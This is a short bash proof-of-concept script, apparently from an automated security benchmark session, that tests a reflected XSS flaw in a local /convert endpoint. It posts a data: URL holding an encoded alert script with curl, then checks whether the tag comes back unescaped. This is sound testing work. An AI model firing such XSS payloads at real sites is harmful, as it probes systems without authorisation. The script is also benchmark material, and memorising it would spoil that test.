#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability in /convert endpoint via data: URL parameter. The vulnerability occurs when a data: URL containing JavaScript is provided in the url parameter. The application fetches the data URL and renders the script tag without proper escaping, allowing JavaScript execution.
# Target: ./repo
# Created: 2025-11-04T17:31:16.152Z
# Session: benchmark-XBEN-033-24-mhkubvue

# Reflected XSS via data: URL in /convert endpoint POC
# This script demonstrates how the url parameter in /convert endpoint
# is vulnerable to reflected XSS when using data: URLs with embedded script tags

TARGET_URL="http://localhost:80/convert"
PAYLOAD="data:text/html,%3Cscript%3Ealert('XSS')%3C/script%3E"

echo "[*] Testing Reflected XSS in /convert endpoint via data: URL parameter"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# Send the malicious data: URL to the /convert endpoint
echo "[*] Sending POST request with data: URL payload..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -d "url=$PAYLOAD" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w "\n%{http_code}")

# Extract HTTP status code from last line
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Check if the response contains the unescaped script tag
if echo "$BODY" | grep -q "<script>alert('XSS')</script>"; then
    echo "[+] VULNERABLE: Script tag found unescaped in response!"
    echo "[+] JavaScript payload will execute in the victim's browser"
    echo ""
    echo "[*] Response excerpt containing the payload:"
    echo "$BODY" | grep -o "<script>alert('XSS')</script>" | head -n1
    echo ""
    echo "[+] This proves the reflected XSS vulnerability exists"
    exit 0
elif echo "$BODY" | grep -q "<script>"; then
    echo "[+] VULNERABLE: Script tags present in response!"
    echo "[*] Response contains:"
    echo "$BODY" | grep -o "<script>.*</script>" | head -n3
    exit 0
else
    echo "[-] Script tag not found in response or properly escaped"
    echo ""
    echo "[*] Full response body:"
    echo "$BODY"
    exit 1
fi